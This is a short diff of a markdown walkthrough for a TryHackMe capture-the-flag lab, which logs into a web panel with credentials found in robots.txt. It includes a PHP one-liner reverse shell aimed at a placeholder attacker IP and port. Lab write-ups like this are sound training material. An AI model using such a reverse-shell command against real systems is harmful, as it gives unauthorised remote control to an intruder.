@@ -1,5 +1,6 @@
 # Tryhackme ctf challenge
 my machine: 10.9.234.242
+
 target ip: 10.10.40.177
 
 #### procedure
@@ -31,7 +32,7 @@ target ip: 10.10.40.177
     - eventually we eventually found the password from robots.txt `Wubbalubbadubdub`. Let's try to login using `R1ckRul3s`.
 
 3. Once we logged in we have a command panel where we can run limited commands under the www-data user.
-
+    ![init nmap scan](./images/login_home.png)
     - perform a reverse shell using this command `php -r '$sock=fsockopen("<your ip>",<your port>);exec("/bin/sh -i <&3 >&3 2>&3");'`
     - once we got the shell from our terminal we can see there's a file that we cannot directly open to get the 1st ingredient. (use grep to open)
     ![1st ingredient](./images/first_ingredient.png)
